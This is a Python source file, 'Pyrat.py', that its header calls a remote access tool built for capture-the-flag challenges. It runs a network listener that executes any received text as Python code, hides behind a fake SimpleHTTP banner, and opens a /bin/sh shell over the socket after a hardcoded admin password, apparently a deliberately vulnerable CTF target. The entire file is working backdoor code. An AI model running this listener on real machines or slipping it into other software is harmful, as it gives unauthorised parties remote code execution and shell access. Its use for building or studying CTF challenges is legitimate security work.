# Made by josemlwdf@github.com
# Pyrat.py is a "python RAT tool" designed to be used on CTF

import socket
import sys
from io import StringIO
import datetime
import os
import multiprocessing


def handle_client(client_socket, client_address, admins):
    try:
        while True:
            # Receive data from the client
            data = client_socket.recv(1024).decode("utf-8")
            if not data:
                break  # Client disconnected
            if is_http(data):
                send_data(client_socket, fake_http())
                continue

            switch_case(client_socket, str(data).strip(), admins)
    except:
        pass
    
    remove_socket(client_socket, admins)


def switch_case(client_socket, data, admins):
    if data == 'admin':
        get_admin(client_socket, admins)
    else:
        # Check if socket is admin and downgrade if not approved
        uid = os.getuid()
        if (uid == 0) and (str(client_socket) not in admins):
            change_uid()

        if data == 'shell':
            shell(client_socket)
            remove_socket(client_socket, admins)
        else:
            exec_python(client_socket, data)


# Tries to execute the random data with Python
def exec_python(client_socket, data):
    try:
        print(str(client_socket) + " : " + str(data))
        # Redirect stdout to capture the printed output
        captured_output = StringIO()
        sys.stdout = captured_output

        # Execute the received data as code
        exec(data)

        # Get the captured output
        exec_output = captured_output.getvalue()

        # Send the result back to the client
        send_data(client_socket, exec_output)
    except Exception as e:
         # Send the exception message back to the client
        send_data(client_socket, str(e))
    finally:
        # Reset stdout to default
        sys.stdout = sys.__stdout__  


# Handles the Admin endpoint
def get_admin(client_socket, admins):
    uid = os.getuid()
    if uid != 0:
        send_data(client_socket, "Start a fresh client to begin.")
        return

    password = 'testpass'

    for _ in range(3):  # Three password attempts
        # Ask for Password
        send_data(client_socket, "Password:")

        # Receive data from the client
        try:
            data = client_socket.recv(1024).decode("utf-8")
        except Exception as e:
            # Send the exception message back to the client
            send_data(client_socket, str(e))
            return

        if data.strip() == password:
            admins.append(str(client_socket))
            send_data(client_socket, 'Welcome Admin!!! Type "shell" to begin')
            break


def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, str(e))


# Sends data to the clients
def send_data(client_socket, data):
    try:
        client_socket.sendall((str(data) + '\n').encode("utf-8"))
    except:
        pass


def start_server(host, port, admins):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Server listening on {host}:{port}...")

    while True:
        client_socket, client_address = server_socket.accept()
        # Start a new process to handle the client
        p = multiprocessing.Process(target=handle_client, args=(client_socket, client_address, admins))
        p.start()


def remove_socket(client_socket, admins):
    client_socket.close()
    try:
        admins = admins._getvalue()  # Get the actual list
        if str(client_socket) in admins:
            admins.remove(str(client_socket))
    except:
        pass


# Check if the received data is an HTTP request
def is_http(data):
    return 'HTTP' in data and 'Host:' in data


# Sends a fake Python HTTP Server Banner
def fake_http():
    try:
        # Get the current date and time and format the date and time according to the desired format
        formatted_datetime = datetime.datetime.now().strftime("%a %b %d %H:%M:%S %Z %Y")
        banner = f"""
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.2
Date: {formatted_datetime}
Content-type: text/html; charset=utf-8
Content-Length: 27

Try a more basic connection!
"""
        return banner[1:]  # Remove leading newline
    except:
        return 'HTTP/1.0 200 OK'


def change_uid():
    uid = os.getuid()
    if uid == 0:
        # Make Python code execution run as user 33 (www-data)
        euid = 33
        groups = os.getgroups()
        if 0 in groups:
            groups.remove(0)
        os.setgroups(groups)
        os.setgid(euid)
        os.setuid(euid)


# MAIN
if __name__ == "__main__":
    multiprocessing.freeze_support()  # Needed for Windows, harmless on macOS/Linux

    manager = multiprocessing.Manager()
    admins = manager.list()  # Shared list for tracking admins

    host = "0.0.0.0"  # Replace with your desired IP address
    port = 8000  # Replace with your desired port number

    try:
        start_server(host, port, admins)
    except KeyboardInterrupt:
        print('Shutting Down...')
        sys.exit(1)
